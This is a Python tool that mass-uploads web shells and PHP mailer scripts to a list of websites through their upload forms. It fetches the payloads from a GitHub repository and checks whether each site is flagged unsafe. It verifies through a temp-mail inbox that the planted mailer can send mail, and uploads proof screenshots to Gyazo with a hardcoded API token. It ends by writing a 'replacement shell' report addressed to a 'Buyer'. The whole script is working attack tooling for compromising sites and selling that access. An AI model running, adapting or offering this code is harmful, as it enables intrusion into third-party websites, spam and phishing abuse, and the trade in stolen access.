#!/usr/bin/env python3
# -*- coding=utf-8 -*-
"""
    Coded By Who Knows
    Please don't change any code
    https://t.me/Moonlightcrow
"""
import ssl
import time
import os
import random
import re
import requests
import string
from platform import system
from time import time as timer
from colorama import Fore, Style
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
PYTHONWARNINGS = "ignore:Unverified HTTPS request"

try:
    from mechanize import Browser
except ImportError:
    print("[-] mechanize not installed!")
    exit()

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
except ImportError:
    print("[-] selenium not installed!")
    exit()

try:
    from gyazo import Api
except ImportError:
    print(f"[-] gyazo not installed! ")
    exit()


def clear():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')


Folders = ['result', 'screenshots', 'files']
for Folder in Folders:
    os.makedirs(Folder, exist_ok=True)

browser = Browser()
browser.set_handle_robots(False)
browser.set_handle_referer(True)
browser.set_handle_redirect(True)
browser.set_handle_equiv(True)
browser.set_ca_data(context=ssl._create_unverified_context(cert_reqs=ssl.CERT_NONE))
browser.addheaders = [('User-agent',
                       'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')]
headers1 = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36'}


def uploader(host, file2upload):
    try:
        browser.open(host, timeout=15)
        browser.select_form(enctype="multipart/form-data")
        browser.form.add_file(open(file2upload), 'text/plain', file2upload)
        browser.submit()
        return True
    except:
        print(f"{Fore.RED}[Failed]{Style.RESET_ALL} {host}")
        save_result(host + '\n', "result/failed.txt")
        return False


def random_kod3(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))


headers = {'Connection': 'keep-alive',
           'Cache-Control': 'max-age=0',
           'Upgrade-Insecure-Requests': '1',
           'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
           'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
           'Accept-Encoding': 'gzip, deflate',
           'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
           'referer': 'bing.com'}


def photo_uploader(xphoto):
    try:
        # api of gyazo
        client = Api(access_token='QKbkg8kz3PIW7mO5NWgAjvHqW2yr54AaUPR6KuN94qk')
        # upload an image
        with open(xphoto, 'rb') as kod3:
            image = client.upload_image(kod3)
            photo_upload_url = re.findall(re.compile('"url": "(.*)\.png"'), str(image.to_json()))[0] + '.png'

        return photo_upload_url
    except Exception as e:
        print(f"[-] Photo can't upload ! -> {e}")


def get_content(url, file_path):
    try:
        # Check if the file already exists
        if os.path.exists(file_path):
            print(f"{file_path} already exists.")
            return

        response = requests.get(url, headers=headers1, timeout=15, verify=False)
        content = response.text

        with open(file_path, 'w') as file:
            file.write(content)
        print(f"File saved to {file_path}")

    except requests.exceptions.RequestException as e:
        print(f"Error !  {url}: {e}")


def get_files():
    """
    :return:
    """
    urls_and_paths = [
        ("https://raw.githubusercontent.com/uidr00t/rere/main/replace.php", 'files/replace.php'),
        ("https://raw.githubusercontent.com/uidr00t/rere/main/test.php", 'files/testx.php'),
        ("https://raw.githubusercontent.com/uidr00t/rere/main/unzip.php", 'files/unzip.php')
    ]

    for url, path in urls_and_paths:
        get_content(url, path)


def get_host_and_url(url):
    url = str(url).replace("www.", "")

    if 'http://' in url or 'https://' in url:
        url_parts = url.split('/')
        host = url_parts[2]
    else:
        host = url.split('/')[0]

    full_url = "https://" + host

    return full_url, host


def save_result(data, file_location):
    with open(file_location, 'a') as file:
        file.write(data)
        file.close()


def replacement_shell_auto(url):
    global driver
    try:
        driver = webdriver.Chrome()
        full_url, host = get_host_and_url(url)
        check_google_safe_data = "https://transparencyreport.google.com/safe-browsing/search?url="
        driver.get(check_google_safe_data + full_url)
        time.sleep(2)
        if 'This site is unsafe' in driver.page_source:
            print(f"{Fore.RED}[!]{Style.RESET_ALL} {full_url} {Fore.RED} ==> Deceptive site ahead  !{Style.RESET_ALL}")
            driver.quit()
            save_result(full_url + '\n', "result/red-site.txt")
        else:
            print(f"{Fore.GREEN}[+]{Style.RESET_ALL} {full_url} {Fore.GREEN} ==> Green Shell <3  {Style.RESET_ALL}")
            save_result(full_url + '\n', "result/green-site.txt")
            success1 = uploader(url, "files/testx.php")
            success2 = uploader(url, "files/unzip.php")
            if not (success1 is False and success2 is False):
                png_gen = random_kod3(10) + '.png'
                driver.get_screenshot_as_file("screenshots/" + png_gen)
                Proof_for_not_phishing = photo_uploader("screenshots/" + png_gen)
                mail_test_url = url.rstrip('/').rsplit('/', 1)[0] + '/' + "testx.php"
                unzip_url = url.rstrip('/').rsplit('/', 1)[0] + '/' + "unzip.php"
                fatch_host_data = requests.get(mail_test_url, headers=headers, timeout=15, verify=False).text
                if "Check  Mailling ..<br>" in fatch_host_data:
                    print(
                        f"{Fore.GREEN}[+]{Style.RESET_ALL} {mail_test_url} {Fore.GREEN} ==> Mailer upload done  {Style.RESET_ALL}")
                    mail_name = random_kod3(10)
                    ranx = str(random.randint(1, 100000) * 987)
                    shell_older = f'{host} - {ranx}'
                    time.sleep(1.5)
                    ml = 'https://tempmail.plus/en?' + mail_name + '@mailto.plus'
                    print(
                        f"{Fore.GREEN}[+]{Style.RESET_ALL} {ml} {Fore.GREEN} ==> Temp Mail Address  {Style.RESET_ALL}")
                    xml = mail_name + '@mailto.plus'
                    driver.execute_script(f"window.open('https://tempmail.plus/en?{mail_name}@mailto.plus', 'tab1');")
                    driver.switch_to.window('tab1')
                    time.sleep(0.5)
                    driver.execute_script(f"window.open('{mail_test_url}', 'tab2');")
                    time.sleep(0.5)
                    driver.switch_to.window('tab2')
                    driver.find_element(By.NAME, 'email').send_keys(xml)
                    time.sleep(1.5)
                    driver.find_element(By.NAME, 'orderid').send_keys(shell_older)
                    time.sleep(1.5)
                    driver.find_element(By.XPATH, '//input[3]').click()
                    time.sleep(2)
                    driver.switch_to.window('tab1')
                    time.sleep(7)
                    xhtml = driver.execute_script("return document.getElementsByTagName('html')[0].innerHTML")
                    start = timer()
                    while (str(shell_older) not in str(xhtml.encode("utf-8"))) and ((timer() - start) < 50):
                        xhtml = driver.execute_script("return document.getElementsByTagName('html')[0].innerHTML")

                    if str(shell_older) in str(xhtml.encode("utf-8")):
                        print(
                            f"{Fore.GREEN}[+]{Style.RESET_ALL} {host} {Fore.GREEN} ==> Sending mail is Working.{Style.RESET_ALL}")
                        png_name = random_kod3(10) + '.png'
                        driver.get_screenshot_as_file("screenshots/" + png_name)
                        Proof_for_send_results = photo_uploader("screenshots/" + png_name)
                        driver.switch_to.window('tab2')
                        time.sleep(1)
                        png_name = random_kod3(10) + '.png'
                        driver.get_screenshot_as_file("screenshots/" + png_name)
                        Proof_for_upload_working = photo_uploader("screenshots/" + png_name)
                        time.sleep(2.5)
                        uploader(url, "files/replace.php")
                        replacement_shell = url.rstrip('/').rsplit('/', 1)[0] + '/' + "replace.php"
                        driver.execute_script(f"window.open('{replacement_shell}', 'tab3');")
                        time.sleep(0.5)
                        driver.switch_to.window('tab3')
                        png_name = random_kod3(10) + '.png'
                        driver.get_screenshot_as_file("screenshots/" + png_name)
                        Screen_of_shell = photo_uploader("screenshots/" + png_name)
                        all_reply_shell = f"""This is a replacement
        
Shell URL: {replacement_shell}

Proof for not phishing detected: {Proof_for_not_phishing}

Proof for upload working: {Proof_for_upload_working}
Screen: {Screen_of_shell}
        
Proof for send results: {Proof_for_send_results}
You can test: {mail_test_url}
        
For unzip your file, you can use: {unzip_url}
        
Buyer, check, and confirm?
        """
                        save_result(all_reply_shell + '\n', 'result/Report_reply.txt')

                        print()
                        print(all_reply_shell)
                        driver.quit()
                    else :
                        print(
                        f"{Fore.RED}[!]{Style.RESET_ALL} {host}  {Fore.RED} ==> Timeout  sending mail not work ! {Style.RESET_ALL}")
                        driver.quit()
                else:
                    driver.quit()
                    print(
                        f"{Fore.RED}[!]{Style.RESET_ALL} {host}  {Fore.RED} ==> Something is Error !  {Style.RESET_ALL}")

            else:
                print(f"{Fore.RED}[!]{Style.RESET_ALL} {url}  {Fore.RED} ==> Can't upload shell{Style.RESET_ALL}")
                driver.quit()

    except Exception as e:
        print(f"{Fore.RED}[!]{Style.RESET_ALL} {url}  {Fore.RED} ==> Something is Error ! {e}{Style.RESET_ALL}")
        driver.quit()


def banner():
    print(f"""\t
\t
\t███╗   ███╗ █████╗ ███████╗██████╗ ██████╗ 
\t████╗ ████║██╔══██╗██╔════╝██╔══██╗██╔══██╗
\t██╔████╔██║███████║███████╗██████╔╝██████╔╝
\t██║╚██╔╝██║██╔══██║╚════██║██╔══██╗██╔══██╗
\t██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║
\t╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
\t                                           v0.1                                       
""")
    print(f"""\tMass Auto Shell Reoprt Reply by {Fore.GREEN}Who Knows{Style.RESET_ALL}
    \n\t {Fore.GREEN}TeaM : @Moonlightcrow{Style.RESET_ALL} Telegram : https://t.me/Moonlightcrow
""")


def main():
    get_files()
    clear()
    banner()

    try:
        file_path = input('[XxX] Enter site List: ').strip()
        with open(file_path, 'r') as file:
            url_list = file.read().splitlines()
    except IOError as e:
        print(f"Error reading file: {e}")
    else:
        for url in url_list:
            replacement_shell_auto(url)


if __name__ == "__main__":
    main()
